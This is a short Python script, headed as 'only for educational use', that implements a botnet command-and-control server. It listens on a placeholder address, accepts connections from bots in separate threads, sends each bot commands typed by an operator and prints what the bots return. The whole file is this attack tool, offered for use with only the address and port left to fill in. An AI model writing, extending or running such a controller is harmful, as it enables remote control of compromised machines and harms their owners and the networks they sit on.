# This is only for educational use 

import socket
import threading

# The IP address and port to listen on
host = 'YOUR_MAIN_HOST_IP'
port = YOUR_MAIN_HOST_PORT

def handle_bot(bot_socket, bot_address):
    print('Bot connected:', bot_address)

    # Send commands to the bot and receive results
    while True:
        command = input('Enter command: ')
        bot_socket.send(command.encode())

        if command.lower() == 'exit':
            break

        result = bot_socket.recv(1024).decode()
        print('Bot response:', result)

    # Close the connection with the bot
    bot_socket.close()
    print('Bot disconnected:', bot_address)

def start_main_host():
    # Create a socket to listen for connections
    main_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_host.bind((host, port))
    main_host.listen(5)
    print('Main host listening on {}:{}'.format(host, port))

    # Accept incoming connections from bots
    while True:
        bot_socket, bot_address = main_host.accept()

        # Handle the bot connection in a new thread
        bot_thread = threading.Thread(target=handle_bot, args=(bot_socket, bot_address))
        bot_thread.start()

    # Close the main host
    main_host.close()

# Start the main host
start_main_host()
